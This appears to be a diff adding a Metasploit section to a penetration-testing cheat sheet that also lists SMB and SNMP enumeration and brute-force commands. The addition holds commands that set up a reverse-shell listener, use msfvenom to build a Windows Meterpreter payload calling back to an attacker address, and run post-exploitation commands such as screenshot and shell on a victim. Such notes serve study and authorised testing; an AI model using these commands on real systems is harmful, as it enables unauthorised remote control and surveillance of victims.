@@ -32,6 +32,24 @@ smbclient -U <user> \\\\<target>\\<smb share> # Authenticates to an SMB share us
 snmpwalk -v <version> -c <community> <target> <OID> # Queries an SNMP device using a specified SNMP version and community string to retrieve the value of a given OID.
 onesixtyone -c <community_list> <target> # Brute-forces SNMP community strings on the target host.
 
+# Penetration testing
+
+## Metasploit
+
+use exploit/multi/handler # Starts a Metasploit listener to catch incoming reverse shell connections from a deployed payload.
+set payload windows/meterpreter/reverse_tcp # Sets the payload to match the one used when generating the executable.
+set LHOST <Attacker's IP Address> # Specifies the attacker's IP address to listen on.
+set LPORT <Attacker's Port Number> # Specifies the port to listen on for the incoming connection.
+exploit  # Launches the handler and awaits the reverse connection from the target.
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker's IP Address> LPORT=<Attacker's Port Number> -f exe -o /path/to/output/payload.exe  # Generates a Windows Meterpreter reverse TCP payload as an executable, connecting back to the specified IP address and port upon execution.
+
+## Meterpreter Commands
+
+sysinfo  # To view the victim's system information
+shell  # To access the command line on the victim's computer
+screenshot  # To take a screenshot of the victim's screen
+
 # Web Enumeration
 
 ## Gobuster
